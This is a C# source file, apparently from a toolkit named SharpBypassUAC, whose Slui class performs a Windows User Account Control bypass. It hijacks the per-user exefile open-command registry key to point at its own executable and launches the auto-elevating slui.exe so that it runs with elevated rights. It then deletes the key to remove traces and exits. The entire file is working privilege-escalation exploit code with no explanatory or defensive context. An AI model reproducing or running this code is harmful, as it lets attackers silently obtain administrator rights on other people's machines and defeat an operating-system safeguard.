using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace SharpBypassUAC;

public class Slui
{
	[DllImport("kernel32.dll")]
	public static extern int WinExec(string exeName, int operType);

	public Slui()
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", writable: true);
		registryKey.CreateSubKey("exefile\\Shell\\Open\\command");
		RegistryKey? registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\exefile\\Shell\\Open\\command", writable: true);
		registryKey2.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
		registryKey2.Close();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\slui.exe";
		WinExec("cmd.exe /k START " + text, 0);
		Thread.Sleep(1000);
		registryKey.DeleteSubKeyTree("exefile");
		Environment.Exit(0);
	}
}
